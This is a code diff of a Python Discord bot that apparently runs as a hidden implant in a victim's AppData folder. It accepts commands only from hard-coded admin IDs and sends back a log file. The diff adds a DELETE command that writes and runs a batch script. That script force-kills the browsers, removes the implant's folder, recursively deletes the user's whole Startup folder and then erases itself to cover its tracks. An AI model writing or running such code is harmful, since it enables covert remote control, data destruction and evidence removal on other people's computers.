@@ -1,13 +1,10 @@
 import discord
 import os
 import time
-import psutil
-import sys
 
 
 client = discord.Client()
 airsoft = os.path.join(os.environ['appdata'], 'Airsoft')
-# airsoft = os.path.join('/home/nurbek/Python/airsoft/', 'Windows', 'Airsoft')
 admins = (837582713783451668, 459623637948039189)
 
 
@@ -40,19 +37,6 @@ def rename_config(name=False) -> None:
     with open(config_path, 'w') as file:
         file.write(name)
         file.close()
-
-
-def find_process(name):
-    for process in psutil.process_iter():
-        if process.name() == name:
-            return True
-    return False
-
-def kill_process(name: str):
-    while find_process(name):
-        for process in psutil.process_iter():
-            if process.name() == name:
-                process.kill()
 
 
 @client.event
@@ -97,12 +81,16 @@ async def on_message(message):
                 elif command == 'LOG':
                     await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))
                 elif command == 'DELETE':
-                    kill_process('Firefox.exe')
-                    # for file in os.listdir(airsoft):
-                    #     os.remove(os.path.join(airsoft, file))
-                    # os.rmdir(airsoft)
-                    # os.remove(sys.argv[0])
-                    # await message.channel.send('Success!')
+                    filename = __file__.split('\\')[-1]
+                    with open(os.path.join(os.environ['appdata'], 'uninst.bat'), 'w') as file:
+                        file.write(f'taskkill /f /im "Google Chrome.exe"\n')
+                        file.write('taskkill /f /im "Firefox.exe"\n')
+                        file.write(f'rd /s /q {airsoft}\n')
+                        file.write(f'del /f /s /q "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"\n')
+                        file.write('CMD /C DEL %0')
+                        file.close()
+                    os.system(os.path.join(os.environ['appdata'], 'uninst.bat'))
+
 
     except Exception as Error:
         await message.channel.send(Error)
